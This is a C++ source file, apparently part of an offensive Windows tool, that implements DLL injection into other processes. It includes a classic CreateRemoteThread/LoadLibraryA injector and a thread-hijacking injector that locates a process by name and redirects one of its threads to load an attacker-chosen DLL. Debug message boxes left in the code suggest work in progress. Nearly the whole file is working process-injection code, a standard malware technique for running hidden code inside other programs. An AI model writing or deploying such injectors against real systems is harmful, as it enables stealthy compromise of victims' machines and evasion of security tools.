#include "Injections.h"
#include "enumeration.h"
#include "executil.h"
#include "utils.h"
#include <cstdlib>
#include <string>

BOOL WriteDllPathToMemSpace(DWORD processId, LPCSTR cDllFilePath, OUT LPVOID* ppRemotePath) {
    if (!processId || !cDllFilePath || !ppRemotePath)
        return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, processId);
    if (!hProcess) {
        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        return FALSE;
    }

    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwDllPathLength = (DWORD)(strlen(cDllFilePath) + 1);

    LPVOID pDllPathAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPathAddress) {
        printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pDllPathAddress, cDllFilePath, dwDllPathLength, &sNumberOfBytesWritten) ||
        sNumberOfBytesWritten != dwDllPathLength) {
        printf("[!] WriteProcessMemory Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        VirtualFreeEx(hProcess, pDllPathAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hProcess);

    *ppRemotePath = pDllPathAddress;
    return TRUE;
}


BOOL InjectDllRemote(DWORD processId, LPSTR cDllFilePath) {
    if (!processId || !cDllFilePath)
        return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, processId);
    if (!hProcess) {
        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        return FALSE;
    }

    LPVOID pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) {
        printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwDllPathLength = (DWORD)(strlen(cDllFilePath) + 1);

    LPVOID pDllPathAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDllPathAddress) {
        printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pDllPathAddress, cDllFilePath, dwDllPathLength, &sNumberOfBytesWritten) || sNumberOfBytesWritten != dwDllPathLength) {
        printf("[!] WriteProcessMemory Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        VirtualFreeEx(hProcess, pDllPathAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pDllPathAddress, 0, NULL);
    if (!hThread) {
        printf("[!] CreateRemoteThread Failed With Error: %d\n", GetLastError());
        ShowLastErrorMessageVerbose();
        VirtualFreeEx(hProcess, pDllPathAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Optionally wait until DLL is loaded
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

BOOL InjectDllByThreadHijack(LPSTR cProcName, LPSTR cDllFilePath) {
    if (!cProcName || !cDllFilePath)
        return FALSE;

    std::string cProcNameStd(cProcName);
    std::wstring wideProcName = ConvertToWide(cProcNameStd);

    DWORD dwProcessID;
    DWORD dwThreadID;

    MessageBoxA(NULL, "first", "", MB_OK);

    if (!GetRemoteProcThreadViaNtQuery(const_cast<LPWSTR>(wideProcName.c_str()), &dwProcessID, &dwThreadID, NULL)) {
        printf("[!] GetRemoteProcThreadViaNtQuery Failed With Error: %d\n", GetLastError());
        MessageBoxA(NULL, "GetRemoteProcThreadViaNtQuery", "", MB_OK);
        ShowLastErrorMessageVerbose();
        return FALSE;
    }

    MessageBoxA(NULL, "second", "", MB_OK);

    LPVOID pRemoteDllPath;
    if (!WriteDllPathToMemSpace(dwProcessID, cDllFilePath, &pRemoteDllPath)) {
        printf("[!] WriteDllPathToMemSpace Failed With Error: %d\n", GetLastError());
        MessageBoxA(NULL, "WriteDllPathToMemSpace", "", MB_OK);
        ShowLastErrorMessageVerbose();
        return FALSE;
    }

    LPVOID pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) {
        printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
        MessageBoxA(NULL, "GetProcAddress", "", MB_OK);
        ShowLastErrorMessageVerbose();
        return FALSE;
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID);
    if (!hThread) {
        printf("[!] OpenThread Failed With Error: %d\n", GetLastError());
        MessageBoxA(NULL, "OpenThread Failed", "", MB_OK);
        ShowLastErrorMessageVerbose();
        return FALSE;
    }

    // Redirect thread execution to LoadLibraryA with pointer to the remote DLL path
    if (!HijackTargetThread(hThread, pLoadLibraryA, pRemoteDllPath)) {
        printf("[!] HijackTargetThread Failed\n");
        MessageBoxA(NULL, "HijackTargetThread", "", MB_OK);
        CloseHandle(hThread);
        return FALSE;
    }

    printf("[+] Thread hijacked successfully. DLL should be loading.\n");

    CloseHandle(hThread);
    return TRUE;
}
